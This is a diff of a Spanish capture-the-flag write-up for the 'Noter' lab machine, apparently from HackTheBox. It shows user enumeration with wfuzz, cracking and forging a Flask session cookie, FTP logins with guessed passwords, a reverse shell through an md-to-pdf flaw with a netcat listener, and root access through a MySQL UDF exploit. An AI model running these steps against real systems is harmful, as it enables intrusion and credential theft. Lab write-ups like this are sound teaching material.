@@ -61,8 +61,8 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 ```
 
-Tenemos el puerto 21 (ftp), 22 (SSH) y 5000 (http), al parecer usando python con Werkzeug.
-Intentemos conectarnos por ftp como anonymous con una contraseña vacía:
+Tenemos el puerto 21 (ftp), 22 (SSH) y 5000 (http), al parecer usando python con `Werkzeug`.
+Intentemos conectarnos a través de `ftp` como `anonymous` con una contraseña vacía:
 ```shell
 ❯ ftp 10.10.11.160
 Connected to 10.10.11.160.
@@ -77,23 +77,24 @@ ftp: Login failed.
 No podemos acceder, necesitamos credenciales. 
 Tampoco tenemos credenciales para conectarnos por SSH, así que de momento lo dejamos y vamos a por el siguiente servicio, el puerto 5000.
 
-Vamos a nuestro navegador favorito y ponemos `http://10.10.11.160:5000` para realizar la búsqueda, nos muestra lo siguiente: 
+Vamos a nuestro navegador favorito y ponemos `http://10.10.11.160:5000` para realizar la búsqueda. Observamos lo siguiente: 
 
 ![Web Noter](/assets/favicon/2022-09-03/noter1.png)
 
-Es una web para guardar notas. Podemos intentar credenciales por defecto en _Login_ como:
+Es una web para guardar notas. Podemos intentar credenciales por defecto en `Login` como:
 
 - admin:admin
 - administrator:administrator
 - guest:guest
 
-Sin embargo; ninguna funciona. Así que vamos a registrarnos para tener un poco más de alcance:
+Sin embargo, ninguna funciona. Así que vamos a registrarnos para tener un poco más de alcance:
 ![Login Web Noter](/assets/favicon/2022-09-03/noter2.png)
 
-Bueno, vemos que podemos hacer varias cosas: ver nuestras notas, comprar una membresía VIP. También vemos algo interesante: el usuario con el que ingresamos se refleja en el dashboard, por lo que podríamos pensar en _STTI_, ya os digo que no sucede nada si hacemos pruebas en el usuario, en el titulo de las notas ni en el cuerpo de las notas. 
-Inspeccionando un poco más nos encontramos algo con lo que podemos jugar: un __JWT (Json Web Token)__ guardado en las cookies de nuestra sesión :
+Bueno, vemos que podemos hacer varias cosas, entre ellas: ver nuestras notas y comprar una membresía VIP. También vemos algo interesante: el usuario con el cual ingresamos, se refleja en el dashboard, por lo que podríamos pensar en `SSTI` —ya os digo que no sucede nada si hacemos pruebas en el usuario, en el título de las notas ni en el cuerpo de las notas—. 
+Inspeccionando un poco más, nos encontramos algo con lo que podemos jugar: un __JWT (Json Web Token)__ guardado en las cookies de nuestra sesión:
 ![JWT Web Noter](/assets/favicon/2022-09-03/noter3.png)
-(`eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU`)
+
+> eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU
 
 Veamos qué contiene al pasarlo a esta [web](https://jwt.io/) o también podemos decodear la primer parte del Token desde consola:
 ```shell
@@ -104,10 +105,11 @@ Veamos qué contiene al pasarlo a esta [web](https://jwt.io/) o también podemos
   "username": "test123"
 }
 ```
-(En la web tenemos más datos como el tipo de cifrado `HMACSHA256`)
+> En la web tenemos más datos como el tipo de cifrado `HMACSHA256`
+{: .prompt-info}
 
 ## Enumerando usuarios
-Anteriormente en el intento de credenciales por defecto vimos un mensaje de error `Invalid credentials`, cuando usamos el usuario que registramos (test123) con una contraseña errónea aparece el mensaje `Ìnvalid login`, así que tenemos una vía potencial de enumerar usuarios, en mi caso usaré _wfuzz_ (también podríamos crear un script en python para el mismo fin):
+Anteriormente en el intento de acceder usando credenciales por defecto, vimos el mensaje de error `Invalid credentials`. Cuando usamos el usuario que registramos (`test123`) con una contraseña errónea, aparece el mensaje `Ìnvalid login`, así que tenemos una vía potencial de enumerar usuarios. Denodo a lo anterior usaré `wfuzz` —también podríamos crear un script en python para el mismo fin—:
 
 ```shell
 ❯ wfuzz -c --ss 'Invalid login' -w /usr/share/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.160:5000/login
@@ -133,7 +135,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 ## ¿Tienes algún secreto?
 El formato de datos lo podemos ver en la petición que mandamos al intentar ingresar con un usuario y contraseña desde el navegador.
-Lo importante: obtuvimos un usuario, 'blue' ¿Y ahora qué? bueno, haciendo una búsqueda por internet o más bien en la 'Biblia' [hacktricks](https://book.hacktricks.xyz) nos encontramos con algo que nos puede ayudar a [crackear](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) el _secreto_ del _JWT_:
+Lo importante: obtuvimos un usuario, `blue` ¿Y ahora qué? Bueno, haciendo una búsqueda por internet o más bien en la "Biblia", [hacktricks](https://book.hacktricks.xyz), nos encontramos con algo que nos puede ayudar a [crackear](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) el `secreto` del `JWT`:
 
 ```shell
 ❯ flask-unsign --wordlist /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU' --no-literal-eval
@@ -143,13 +145,14 @@ Lo importante: obtuvimos un usuario, 'blue' ¿Y ahora qué? bueno, haciendo una 
 b'secret123'
 ```
 
-Ahora que tenemos el secreto 'secret123' podemos construir nuestro propio JWT para conectarnos con el usuario 'blue':
+Ahora que tenemos el secreto `secret123`, podemos construir nuestro propio `JWT` para conectarnos con el usuario `blue`:
 ```shell
 ❯ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxEq4Q.mqsQtRYlhrqrq2hkn604WPY2PLY
 ```
 
-Cambiamos en el navegador la cookie que teníamos por la que hemos construido y accedemos. Al entrar a la sesión vemos que tiene VIP (con un usuario normal no la teníamos), además observamos que hay dos notas. y una de ellas es  'Noter Premium Membership' en la que encontramos lo siguiente:
+Cambiamos en el navegador la cookie que teníamos por la que hemos construido y accedemos. Al entrar a la sesión vemos que tiene `VIP` —con un usuario normal no la teníamos—. Además, observamos que hay dos notas, y una de ellas es 'Noter Premium Membership' en la que encontramos lo siguiente:
+
 > Written by ftp_admin on Mon Dec 20 01:52:32 2021
 Hello, Thank you for choosing our premium service. Now you are capable of
 doing many more things with our application. All the information you are going
@@ -182,10 +185,11 @@ drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
 -rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
 ftp>
 ```
-(el archivo pdf nos dice la política que se emplea para las contraseñas `username@site_name!`)
+> El archivo PDF nos dice la política que se emplea para las contraseñas `username@site_name!`.
+{: .prompt-info}
 
 ## Accediendo a ftp como ftp_admin
-Sabiendo lo anterio podemos intentar acceder como el usuario admin siguiendo la política:
+Sabiendo lo anterior, podemos intentar acceder como el usuario `admin` siguiendo la política:
 ```shell
 ❯ ftp 10.10.11.160
 Connected to 10.10.11.160.
@@ -205,7 +209,8 @@ drwxr-xr-x    2 0        1003         4096 May 02 23:05 ..
 -rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
 226 Directory send OK.
 ```
-(contraseña: ftp_admin@Noter!)
+> contraseña: `ftp_admin@Noter!`
+{: .prompt-info}
 
 ¡Obtuvimos acceso! Además hay dos backups. Sin rechistar los descargamos:
 ```shell
@@ -224,7 +229,7 @@ ftp> quit
 ```
 
 ## ¿Hay algo o alguien aquí?
-Revisando los archivos nos encontramos con credenciales para la base de datos MySQL:
+Revisando los archivos, nos encontramos con credenciales para la base de datos MySQL:
 ```python
 app.config['MYSQL_USER'] = 'root'
 app.config['MYSQL_PASSWORD'] = 'Nildogg36'
@@ -291,7 +296,7 @@ def export_note_remote():
 	    abort(403)
 ```
 
-Además vemos que se ejecuta con _nodeJS_ `md-to-pdf.js`. Haciendo una búsqueda por internet nos encontramos una [vulnerabilidad](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) que podríamos probar en la sección de la web _Export Notes_ que se otorga solamente para usuarios 'VIP':
+Además, vemos que `md-to-pdf.js` se ejecuta con _NodeJS_. Haciendo una búsqueda por internet nos encontramos una [vulnerabilidad](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) que podríamos probar en la sección de la web _Export Notes_ que se otorga solamente para usuarios 'VIP':
 ![Export Notes Noter ](/assets/favicon/2022-09-03/noter4.png)
 
 Creamos un archivo malicioso:
@@ -303,12 +308,12 @@ Levantamos un servidor con python:
 ```shell
 ❯ python3 -m http.server
 ```
-Y en otra ventana debemos ponernos en 'escucha' con _netcat_ en el puerto que específicamos dentro del archivo malicioso (4433):
+Y en otra ventana debemos ponernos en "escucha" con `netcat` en el puerto que específicamos dentro del archivo malicioso, `4433`:
 ```shell
 ❯ netcat -lnvp 4433
 ```
 
-Y en el campo _URL_ ponemos la siguiente `http://10.10.14.44:8000/rev.md` (que es nuestra IP, el puerto del servidor y el archivo malicioso, respectivamente), presionamos en _exportar_ y obtenemos una conexión remota: 
+Y en el campo _URL_ ponemos lo siguiente `http://10.10.14.44:8000/rev.md` (que es nuestra IP, el puerto del servidor y el archivo malicioso, respectivamente). Presionamos en `exportar` y obtenemos una conexión remota: 
 ```shell
 ❯ netcat -lnvp 4433
 Listening on 0.0.0.0 4433
@@ -319,8 +324,8 @@ svc@noter:~/app/web$
 ```
 
 ## Escalando privilegios
-Después de hacer una enumeración básica no encontramos nada de lo que nos podamos aprovechar.
-Recordemos que tenemos credenciales para conectarnos a la base de datos. Hay una técnica de [escalada](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library) de privilegios mediante MySQL que podemos probar usando [este](https://www.exploit-db.com/exploits/1518) exploit, subiendo el archivo a la máquina víctima y haciendo lo siguiente:
+Después de hacer una enumeración básica, no encontramos nada de lo que nos podamos aprovechar.
+Recordemos que tenemos credenciales para conectarnos a la base de datos. Hay una técnica de [escalada](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library) de privilegios mediante `MySQL` que podemos probar usando [este exploit](https://www.exploit-db.com/exploits/1518), subiendo el archivo a la máquina víctima y haciendo lo siguiente:
 
 ```shell
 svc@noter:~/tmp$ gcc -g -c raptor_udf2.c
@@ -353,7 +358,7 @@ MariaDB [mysql]> exit
 Bye
 ```
 
-Ejecutamos el binario `bash` con privilegios (-p) y nos convertimos en root:
+Ejecutamos el binario `bash` con privilegios (`-p`) y nos convertimos en `root`:
 ```shell
 svc@noter:~/tmp$ /bin/bash -p
 bash-5.0\# whoami
